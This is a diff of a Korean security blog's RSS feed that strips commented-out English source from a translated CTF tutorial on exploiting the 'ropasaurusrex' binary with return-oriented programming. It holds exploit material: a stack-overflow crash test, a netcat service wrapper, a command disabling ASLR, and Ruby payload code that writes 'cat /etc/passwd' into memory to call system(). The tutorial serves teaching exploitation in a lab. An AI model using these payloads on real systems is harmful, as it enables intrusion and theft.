@@ -5,8 +5,8 @@
     <description>Blog for hackers.</description>
     <link>http://yous.be/</link>
     <atom:link href="http://yous.be/atom.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 16 Feb 2015 06:40:10 +0900</pubDate>
-    <lastBuildDate>Mon, 16 Feb 2015 06:40:10 +0900</lastBuildDate>
+    <pubDate>Mon, 16 Feb 2015 06:59:36 +0900</pubDate>
+    <lastBuildDate>Mon, 16 Feb 2015 06:59:36 +0900</lastBuildDate>
     <generator>Jekyll v3.0.0-beta1</generator>
     
       <item>
@@ -1782,7 +1782,7 @@ Date:   Fri Jul &lt;span class=&quot;m&quot;&gt;18&lt;/span&gt; 21:29:14 &lt;spa
 
 &lt;p&gt;이 간단한 아이디어를 설명하자면, 함수 &lt;code&gt;A()&lt;/code&gt;가 함수 &lt;code&gt;B()&lt;/code&gt;를 두 개의 인자 1, 2와 함께 호출한다고 하자. 그리고 &lt;code&gt;B()&lt;/code&gt;는 &lt;code&gt;C()&lt;/code&gt;를 두 개의 인자 3, 4와 함께 호출한다고 하자. &lt;code&gt;C()&lt;/code&gt;가 실행 중일 때, 스택은 이렇게 보일 것이다:&lt;/p&gt;
 
-&lt;!-- ```text
+&lt;!-- ``` text
 +----------------------+
 |         ...          | (higher addresses)
 +----------------------+
@@ -2011,24 +2011,6 @@ Date:   Fri Jul &lt;span class=&quot;m&quot;&gt;18&lt;/span&gt; 21:29:14 &lt;spa
 &lt;!-- Here&#39;s the vulnerable function, fresh from IDA: --&gt;
 
 &lt;p&gt;여기 IDA에서 갓 뽑은 취약한 함수다:&lt;/p&gt;
-
-&lt;!-- ```
-.text:080483F4vulnerable_function proc near
-.text:080483F4
-.text:080483F4buf             = byte ptr -88h
-.text:080483F4
-.text:080483F4         push    ebp
-.text:080483F5         mov     ebp, esp
-.text:080483F7         sub     esp, 98h
-.text:080483FD         mov     dword ptr [esp+8], 100h ; nbytes
-.text:08048405         lea     eax, [ebp+buf]
-.text:0804840B         mov     [esp+4], eax    ; buf
-.text:0804840F         mov     dword ptr [esp], 0 ; fd
-.text:08048416         call    _read
-.text:0804841B         leave
-.text:0804841C         retn
-.text:0804841Cvulnerable_function endp
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;.text:080483F4vulnerable_function proc near
 .text:080483F4
 .text:080483F4buf             = byte ptr -88h
@@ -2048,14 +2030,6 @@ Date:   Fri Jul &lt;span class=&quot;m&quot;&gt;18&lt;/span&gt; 21:29:14 &lt;spa
 &lt;!-- Now, if you don&#39;t know assembly, this might look daunting. But, in fact, it&#39;s simple. Here&#39;s the equivalent C: --&gt;
 
 &lt;p&gt;어셈블리를 모른다면, 좀 벅차보일 것이다. 하지만 사실 간단하다. 같은 함수의 C 코드다:&lt;/p&gt;
-
-&lt;!-- ``` c
-ssize_t __cdecl vulnerable_function()
-{
-  char buf[136];
-  return read(0, buf, 256);
-}
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__cdecl&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vulnerable_function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;136&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
@@ -2069,17 +2043,6 @@ ssize_t __cdecl vulnerable_function()
 &lt;!-- You can easily validate that by running it, piping in a bunch of &#39;A&#39;s, and seeing what happens: --&gt;
 
 &lt;p&gt;이걸 실행함으로써 쉽게 확인할 수 있다. &amp;#39;A&amp;rsquo; 뭉치를 파이프로 넣고, 어떻게 되는지 보자:&lt;/p&gt;
-
-&lt;!-- ``` sh
-ron@debian-x86 ~ $ ulimit -c unlimited
-ron@debian-x86 ~ $ perl -e &quot;print &#39;A&#39;x300&quot; | ./ropasaurusrex
-Segmentation fault (core dumped)
-ron@debian-x86 ~ $ gdb ./ropasaurusrex core
-[...]
-Program terminated with signal 11, Segmentation fault.
-#0  0x41414141 in ?? ()
-(gdb)
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ulimit&lt;/span&gt; -c unlimited
 ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;perl -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;print &amp;#39;A&amp;#39;x300&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; ./ropasaurusrex
 Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
@@ -2096,13 +2059,6 @@ Program terminated with signal 11, Segmentation fault.
 &lt;!-- Now, there are good ways and bad ways to figure out exactly what you control. I used a bad way. I put &quot;BBBB&quot; at the end of my buffer and simply removed &#39;A&#39;s until it crashed at `0x42424242` (&quot;BBBB&quot;): --&gt;
 
 &lt;p&gt;이제, 정확히 뭘 조종하고 있는 건지 알아내기 위한 좋은 방법이 있고 나쁜 방법이 있다. 나는 나쁜 방법을 썼다. 내 버퍼 끝에 &amp;ldquo;BBBB&amp;quot;를 넣고 &lt;code&gt;0x42424242&lt;/code&gt;(&amp;quot;BBBB&amp;rdquo;)에서 크래시를 일으킬 때까지 &amp;#39;A&amp;#39;를 지웠다.&lt;/p&gt;
-
-&lt;!-- ``` sh
-ron@debian-x86 ~ $ perl -e &quot;print &#39;A&#39;x140;print &#39;BBBB&#39;&quot; | ./ropasaurusrex
-Segmentation fault (core dumped)
-ron@debian-x86 ~ $ gdb ./ropasaurusrex core
-#0  0x42424242 in ?? ()
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;perl -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;print &amp;#39;A&amp;#39;x140;print &amp;#39;BBBB&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; ./ropasaurusrex
 Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb ./ropasaurusrex core
@@ -2119,11 +2075,6 @@ ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb ./ropasauru
 &lt;!-- The first thing you should do is start running `ropasaurusrex` as a network service. The folks who wrote the CTF used [xinetd][] to do this, but we&#39;re going to use [netcat][], which is just as good (for our purposes): --&gt;
 
 &lt;p&gt;가장 먼저 해야 할 일은 &lt;code&gt;ropasaurusrex&lt;/code&gt;를 네트워크 서비스로 실행시키는 것이다. CTF 주최자들은 &lt;a href=&quot;https://en.wikipedia.org/wiki/Xinetd&quot;&gt;xinetd&lt;/a&gt;를 썼지만, 우리는 (우리의 목적에) 그만큼 좋은 &lt;a href=&quot;https://en.wikipedia.org/wiki/Netcat&quot;&gt;netcat&lt;/a&gt;을 쓸 것이다.&lt;/p&gt;
-
-&lt;!-- ``` sh
-$ while true; do nc -vv -l -p 4444 -e ./ropasaurusrex; done
-listening on [any] 4444 ...
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; nc -vv -l -p &lt;span class=&quot;m&quot;&gt;4444&lt;/span&gt; -e ./ropasaurusrex&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
 listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;4444&lt;/span&gt; ...
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -2134,10 +2085,6 @@ listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any&lt;span class=&qu
 &lt;!-- You may also want to disable ASLR if you&#39;re following along: --&gt;
 
 &lt;p&gt;ASLR을 끄고 싶다면:&lt;/p&gt;
-
-&lt;!-- ``` sh
-$ sudo sysctl -w kernel.randomize_va_space=0
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo sysctl -w kernel.randomize_va_space&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;!-- Note that this will make your system easier to exploit, so I don&#39;t recommend doing this outside of a lab environment! --&gt;
@@ -2147,22 +2094,6 @@ $ sudo sysctl -w kernel.randomize_va_space=0
 &lt;!-- Here&#39;s some ruby code for the initial exploit: --&gt;
 
 &lt;p&gt;초반 익스플로잇을 위한 루비 코드다:&lt;/p&gt;
-
-&lt;!-- ``` ruby
-require &#39;socket&#39;
-
-$ cat ./sploit.rb
-s = TCPSocket.new(&quot;localhost&quot;, 4444)
-
-# Generate the payload
-payload = &quot;A&quot;*140 +
-  [
-    0x42424242,
-  ].pack(&quot;I*&quot;) # Convert a series of &#39;ints&#39; to a string
-
-s.write(payload)
-s.close()
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/sploit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rb&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;
 
@@ -2180,24 +2111,12 @@ s.close()
 &lt;!-- Run that with `ruby ./sploit.rb` and you should see the service crash: --&gt;
 
 &lt;p&gt;&lt;code&gt;ruby ./sploit.rb&lt;/code&gt;를 통해 실행시키면 서비스 크래시를 볼 것이다:&lt;/p&gt;
-
-&lt;!-- ``` sh
-connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53451
-Segmentation fault (core dumped)
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; from debian-x86.skullseclabs.org &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 53451
 Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;!-- And you can verify, using gdb, that it crashed at the right location: --&gt;
 
 &lt;p&gt;그리고 gdb를 통해 이게 알맞은 위치에서 크래시를 일으킨다는 걸 확인할 수 있다:&lt;/p&gt;
-
-&lt;!-- ``` sh
-gdb --quiet ./ropasaurusrex core
-[...]
-Program terminated with signal 11, Segmentation fault.
-#0  0x42424242 in ?? ()
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;gdb --quiet ./ropasaurusrex core
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
 Program terminated with signal 11, Segmentation fault.
@@ -2250,13 +2169,6 @@ Program terminated with signal 11, Segmentation fault.
 &lt;!-- Tall order? Not really! First things first, let&#39;s find some memory that we can read and write! The most obvious place is the [.data][] section: --&gt;
 
 &lt;p&gt;무리한 요구라고? 그렇지 않다! 중요한 것부터 하자. 우리가 읽고 쓸 수 있는 메모리를 찾아보자! 가장 명백한 곳은 &lt;a href=&quot;https://en.wikipedia.org/wiki/Data_segment&quot;&gt;.data&lt;/a&gt; 섹션이다:&lt;/p&gt;
-
-&lt;!-- ``` sh
-ron@debian-x86 ~ $ objdump -x ropasaurusrex  | grep -A1 &#39;\.data&#39;
- 23 .data         00000008  08049620  08049620  00000620  2**2
-                   CONTENTS, ALLOC, LOAD, DATA
-
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump -x ropasaurusrex  &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep -A1 &lt;span class=&quot;s1&quot;&gt;&amp;#39;\.data&amp;#39;&lt;/span&gt;
  &lt;span class=&quot;m&quot;&gt;23&lt;/span&gt; .data         &lt;span class=&quot;m&quot;&gt;00000008&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;08049620&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;08049620&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;00000620&lt;/span&gt;  2**2
                    CONTENTS, ALLOC, LOAD, DATA
@@ -2264,12 +2176,6 @@ ron@debian-x86 ~ $ objdump -x ropasaurusrex  | grep -A1 &#39;\.data&#39;
 &lt;!-- Uh oh, .data is only 8 bytes long. That&#39;s not enough! In theory, any address that&#39;s long enough, writable, and not used will be enough for what we need. Looking at the output for `objdump -x`, I see a section called .dynamic that seems to fit the bill: --&gt;
 
 &lt;p&gt;오 이런, .data는 8바이트밖에 되지 않는다. 이건 부족하다! 이론적으로, 충분히 길고, 쓸 수 있으며(writable), 사용되지 않은 주소는 우리 목적에 충분하다. &lt;code&gt;objdump -x&lt;/code&gt;의 출력에서, 나는 딱 알맞아 보이는 .dynamic 섹션을 발견했다.&lt;/p&gt;
-
-&lt;!-- ``` sh
-
- 20 .dynamic      000000d0  08049530  08049530  00000530  2**2
-                   CONTENTS, ALLOC, LOAD, DATA
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt; &lt;span class=&quot;m&quot;&gt;20&lt;/span&gt; .dynamic      000000d0  &lt;span class=&quot;m&quot;&gt;08049530&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;08049530&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;00000530&lt;/span&gt;  2**2
                    CONTENTS, ALLOC, LOAD, DATA
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -2280,20 +2186,6 @@ ron@debian-x86 ~ $ objdump -x ropasaurusrex  | grep -A1 &#39;\.data&#39;
 &lt;!-- The next step is to find a function that can write our command string to address `0x08049530`. The most convenient functions to use are the ones that are in the executable itself, rather than a library, since the functions in the executable won&#39;t change from system to system. Let&#39;s look at what we have: --&gt;
 
 &lt;p&gt;다음 단계는 주소 &lt;code&gt;0x08049530&lt;/code&gt;에 명령어 문자열을 쓸 수 있는 함수를 찾는 것이다. 가장 쓰기 편리한 함수는 라이브러리보다 실행 파일 자체에 들어 있는 것인데, 실행 파일 안의 함수는 시스템에 따라 변하지 않기 때문이다. 우리에게 무엇이 있는지 살펴보자:&lt;/p&gt;
-
-&lt;!-- ``` sh
-ron@debian-x86 ~ $ objdump -R ropasaurusrex
-
-ropasaurusrex:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-08049600 R_386_GLOB_DAT    __gmon_start__
-08049610 R_386_JUMP_SLOT   __gmon_start__
-08049614 R_386_JUMP_SLOT   write
-08049618 R_386_JUMP_SLOT   __libc_start_main
-0804961c R_386_JUMP_SLOT   read
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump -R ropasaurusrex
 
 ropasaurusrex:     file format elf32-i386
@@ -2309,10 +2201,6 @@ OFFSET   TYPE              VALUE
 &lt;!-- So, we have `read()` and `write()` immediately available. That&#39;s helpful! The `read()` function will read data from the socket and write it to memory. The prototype looks like this: --&gt;
 
 &lt;p&gt;즉시 사용 가능한 &lt;code&gt;read()&lt;/code&gt;와 &lt;code&gt;write()&lt;/code&gt;를 찾았다. 이건 유용하다! &lt;code&gt;read()&lt;/code&gt; 함수는 소켓에서 데이터를 읽을 것이고 그걸 메모리에 쓸 것이다. 프로토타입은 이럴 것이다:&lt;/p&gt;
-
-&lt;!-- ``` c
-ssize_t read(int fd, void *buf, size_t count);
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;!-- This means that, when you enter the `read()` function, you want the stack to look like this: --&gt;
@@ -2359,44 +2247,6 @@ ssize_t read(int fd, void *buf, size_t count);
 &lt;!-- We update our exploit to look like this (explanations are in the comments): --&gt;
 
 &lt;p&gt;익스플로잇을 이렇게 업데이트 하자 (설명은 주석에 있다):&lt;/p&gt;
-
-&lt;!-- ``` ruby
-$ cat sploit.rb
-require &#39;socket&#39;
-
-s = TCPSocket.new(&quot;localhost&quot;, 4444)
-
-# The command we&#39;ll run
-cmd = ARGV[0] + &quot;\0&quot;
-
-# From objdump -x
-buf = 0x08049530
-
-# From objdump -D ./ropasaurusrex | grep read
-read_addr = 0x0804832C
-# From objdump -D ./ropasaurusrex | grep write
-write_addr = 0x0804830C
-
-# Generate the payload
-payload = &quot;A&quot;*140 +
-  [
-    cmd.length, # number of bytes
-    buf,        # writable memory
-    0,          # stdin
-    0x43434343, # read&#39;s return address
-
-    read_addr # Overwrite the original return
-  ].reverse.pack(&quot;I*&quot;) # Convert a series of &#39;ints&#39; to a string
-
-# Write the &#39;exploit&#39; payload
-s.write(payload)
-
-# When our payload calls read() the first time, this is read
-s.write(cmd)
-
-# Clean up
-s.close()
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sploit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rb&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;
 
@@ -2436,21 +2286,11 @@ s.close()
 &lt;!-- We run that against the target: --&gt;
 
 &lt;p&gt;공격 대상에 실행해 보자:&lt;/p&gt;
-
-&lt;!-- ``` sh
-ron@debian-x86 ~ $ ruby sploit.rb &quot;cat /etc/passwd&quot;
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby sploit.rb &lt;span class=&quot;s2&quot;&gt;&amp;quot;cat /etc/passwd&amp;quot;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;!-- And verify that it crashes: --&gt;
 
 &lt;p&gt;그리고 크래시를 일으키는 걸 확인해라:&lt;/p&gt;
-
-&lt;!-- ``` sh
-listening on [any] 4444 ...
-connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53456
-Segmentation fault (core dumped)
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;4444&lt;/span&gt; ...
 connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; from debian-x86.skullseclabs.org &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 53456
 Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
@@ -2458,15 +2298,6 @@ Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;
 &lt;!-- Then verify that it crashed at the return address of `read()` (`0x43434343`) and wrote the command to the memory at `0x08049530`: --&gt;
 
 &lt;p&gt;그게 &lt;code&gt;read()&lt;/code&gt;의 반환 주소(&lt;code&gt;0x43434343&lt;/code&gt;)에서 크래시를 일으켰고 명령어를 메모리 &lt;code&gt;0x08049530&lt;/code&gt;에 썼다는 걸 확인해라:&lt;/p&gt;
-
-&lt;!-- ``` sh
-$ gdb --quiet ./ropasaurusrex core
-[...]
-Program terminated with signal 11, Segmentation fault.
-#0  0x43434343 in ?? ()
-(gdb) x/s 0x08049530
-0x8049530:       &quot;cat /etc/passwd&quot;
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb --quiet ./ropasaurusrex core
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
 Program terminated with signal 11, Segmentation fault.
@@ -2485,13 +2316,6 @@ Program terminated with signal 11, Segmentation fault.
 &lt;!-- Now that we&#39;ve written `cat /etc/passwd` into memory, we need to call `system()` and point it at that address. It turns out, if we assume ASLR is off, this is easy. We know that the executable is linked with libc: --&gt;
 
 &lt;p&gt;이제 우린 &lt;code&gt;cat /etc/passwd&lt;/code&gt;를 메모리에 썼고, &lt;code&gt;system()&lt;/code&gt;을 호출해서 저 주소를 가리키면 된다. 거의 다 됐다. ASLR이 적용되지 않았다면 쉽다. 실행 파일에는 libc가 링크되어 있다:&lt;/p&gt;
-
-&lt;!-- ``` sh
-$ ldd ./ropasaurusrex
-        linux-gate.so.1 =&gt;  (0xb7703000)
-        libc.so.6 =&gt; /lib/i686/cmov/libc.so.6 (0xb75aa000)
-        /lib/ld-linux.so.2 (0xb7704000)
-&amp;ldquo;` &amp;ndash;&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd ./ropasaurusrex
         linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7703000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
         libc.so.6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; /lib/i686/cmov/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb75aa000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
@@ -2500,13 +2324,6 @@ $ ldd ./ropasaurusrex
 &lt;!-- And `libc.so.6` contains the `system()` function: --&gt;
 
 &lt;p&gt;그리고 &lt;code&gt;libc.so.6&lt;/code&gt;엔 &lt;code&gt;system()&lt;/code&gt; 함수가 포함되어 있다:&lt;/p&gt;
-
-&lt;!-- ``` sh
-$ objdump -T /lib/i686/cmov/libc.so.6 | grep system
-000f5470 g    DF .text  00000042  GLIBC_2.0   svcerr_systemerr
-00039450 g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
-00039450  w   DF .text  0000007d  GLIBC_2.0   system
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump -T /lib/i686/cmov/libc.so.6 &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep system
 000f5470 g    DF .text  &lt;span class=&quot;m&quot;&gt;00000042&lt;/span&gt;  GLIBC_2.0   svcerr_systemerr
 &lt;span class=&quot;m&quot;&gt;00039450&lt;/span&gt; g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
@@ -2515,15 +2332,6 @@ $ objdump -T /lib/i686/cmov/libc.so.6 | grep system
 &lt;!-- We can figure out the address where `system()` ends up loaded in ropasaurusrex in our debugger: --&gt;
 
 &lt;p&gt;디버거를 통해 ropasaurusrex에서 로드된 &lt;code&gt;system()&lt;/code&gt; 주소를 알아낼 수 있다:&lt;/p&gt;
-
-&lt;!-- ``` sh
-$ gdb --quiet ./ropasaurusrex core
-[...]
-Program terminated with signal 11, Segmentation fault.
-#0  0x43434343 in ?? ()
-(gdb) x/x system
-0xb7ec2450 &lt;system&gt;:    0x890cec83
-&amp;rdquo;` &amp;ndash;&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb --quiet ./ropasaurusrex core
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
 Program terminated with signal 11, Segmentation fault.
@@ -2860,16 +2668,6 @@ Program terminated with signal 11, Segmentation fault.
 &lt;!-- Finding a `pop/pop/pop/ret` is pretty easy using `objdump`: --&gt;
 
 &lt;p&gt;&lt;code&gt;pop/pop/pop/ret&lt;/code&gt;은 &lt;code&gt;objdump&lt;/code&gt;를 이용하면 어렵지 않게 찾을 수 있다:&lt;/p&gt;
-
-&lt;!-- ``` sh
-$ objdump -d ./ropasaurusrex | egrep &#39;pop|ret&#39;
-[...]
- 80484b5:       5b                      pop    ebx
- 80484b6:       5e                      pop    esi
- 80484b7:       5f                      pop    edi
- 80484b8:       5d                      pop    ebp
- 80484b9:       c3                      ret
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump -d ./ropasaurusrex &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; egrep &lt;span class=&quot;s1&quot;&gt;&amp;#39;pop|ret&amp;#39;&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
  80484b5:       5b                      pop    ebx
@@ -2950,58 +2748,6 @@ $ objdump -d ./ropasaurusrex | egrep &#39;pop|ret&#39;
 &lt;!-- We also update our exploit with a `s.read()` at the end, to read whatever data the remote server sends us. The current exploit now looks like: --&gt;
 
 &lt;p&gt;원격 서버에서 보내는 걸 받기 위해 &lt;code&gt;s.read()&lt;/code&gt;를 익스플로잇 마지막에 추가하자. 현재 익스플로잇은 다음과 같다:&lt;/p&gt;
-
-&lt;!-- ``` ruby
-require &#39;socket&#39;
-
-s = TCPSocket.new(&quot;localhost&quot;, 4444)
-
-# The command we&#39;ll run
